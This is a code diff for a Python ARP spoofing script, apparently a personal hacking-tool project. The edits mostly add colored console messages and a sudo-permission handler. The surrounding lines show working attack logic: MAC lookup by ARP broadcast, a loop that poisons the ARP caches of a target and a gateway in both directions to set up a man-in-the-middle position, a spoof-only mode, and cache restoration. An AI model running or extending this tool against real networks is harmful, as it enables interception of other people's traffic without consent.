@@ -9,7 +9,8 @@
 import kamene.all as sp
 import argparse
 from time import sleep
-
+from colors import *
+from sys import exit
 
 def get_args():
 	parser = argparse.ArgumentParser('ARP spoofer')
@@ -28,9 +29,9 @@ def get_args():
 
 def check_args(target_ip, spoof_ip):
     if not target_ip:
-        exit("[-] Please enter target ip as argument, use -h or --help for more info")
+        exit(BRIGHT_RED + "[-] Please enter target ip as argument, use -h or --help for more info")
     elif not spoof_ip:
-        exit("[-] Please enter spoof ip as argument, use -h or --help for more info")
+        exit(BRIGHT_RED + "[-] Please enter spoof ip as argument, use -h or --help for more info")
  
     return True
 
@@ -41,14 +42,17 @@ def generate_packet(PDST, HWDST, PSRC):
 
 
 def get_mac(ip):
-	arp_req = sp.ARP(pdst=ip)
-	brdcst = sp.Ether(dst='ff:ff:ff:ff:ff:ff')
+	try:
+		arp_req = sp.ARP(pdst=ip)
+		brdcst = sp.Ether(dst='ff:ff:ff:ff:ff:ff')
 
-	packet = brdcst / arp_req
-	responded_list = sp.srp(packet, timeout = 2, verbose = False, retry=3)[0]
+		packet = brdcst / arp_req
+		responded_list = sp.srp(packet, timeout = 2, verbose = False, retry=3)[0]
 
-	return responded_list[0][1].hwsrc
-
+		return responded_list[0][1].hwsrc
+	except PermissionError:
+		print(BRIGHT_RED + '[-] run with sudo.')
+		exit()
 
 def spoof(target_ip, spoof_ip, args_status):
 	if args_status:
@@ -60,7 +64,7 @@ def spoof(target_ip, spoof_ip, args_status):
 
 
 def mitm(target_ip, spoof_ip, args_status):
-	print('[+] Launching MITM ARP Attack....')
+	print(BRIGHT_YELLOW + '[+] Launching MITM ARP Attack....')
 	packets_sent = 0
 	is_attacking = True
 	while is_attacking:
@@ -68,28 +72,26 @@ def mitm(target_ip, spoof_ip, args_status):
 			spoof(target_ip, spoof_ip, args_status)
 			spoof(spoof_ip, target_ip, args_status)
 			packets_sent += 2
-			print('\r[+] Packets sent: ' + str(packets_sent), end='')
+			print(BRIGHT_WHITE + '\r[+] Packets sent: ' + str(packets_sent), end='')
 			sleep(2)
 		except KeyboardInterrupt:
-			print('\r\n[+] Stopping MITM attack and restoring default settings...')
-
+			print(BRIGHT_YELLOW +'\r\n[+] Stopping MITM attack and restoring default settings...')
 			is_attacking = False
 
 
 def spoof_only(target_ip, spoof_ip, args_status):
-	print(f'[+] Spoofing {target_ip} as {spoof_ip}....')
+	print(BRIGHT_YELLOW +  f'[+] Spoofing {target_ip} as {spoof_ip}....')
 	
 	packets_sent = 0
 	is_spoofing = True
 	while is_spoofing:
 		try:
 			spoof(target_ip, spoof_ip, args_status)
-			print('\r[+] Packets sent: ' + str(packets_sent), end='')
+			print(BRIGHT_WHITE + '\r[+] Packets sent: ' + str(packets_sent), end='')
 			packets_sent += 1
 			sleep(2)
 		except KeyboardInterrupt:
-			print('\r\n[+] Stopping and restoring default settings...')
-
+			print(BRIGHT_YELLOW + '\r\n[+] Stopping and restoring default settings...')
 			is_spoofing = False
 
 
@@ -101,7 +103,7 @@ def restore_default_table(dst_ip, src_ip):
 		sp.send(packet, verbose = False, count=4)
 
 	except Exception as e:
-		print('[-] Exception occurred while restoring MAC address')
+		print(BRIGHT_RED +'[-] Exception occurred while restoring MAC address')
 		raise(e)
 
 
@@ -114,8 +116,8 @@ else:
 	spoof_only(TARGET_IP, SPOOF_IP, ARGS_STATUS)
 
 
-print('[+] Restoring default table for target and gateway....')
+print(BRIGHT_YELLOW + '[+] Restoring default table for target and gateway....')
 restore_default_table(TARGET_IP, SPOOF_IP)
 restore_default_table(SPOOF_IP, TARGET_IP)
 
-print('[+] Closing Program...')
+print(BRIGHT_RED +'[+] Closing Program...')
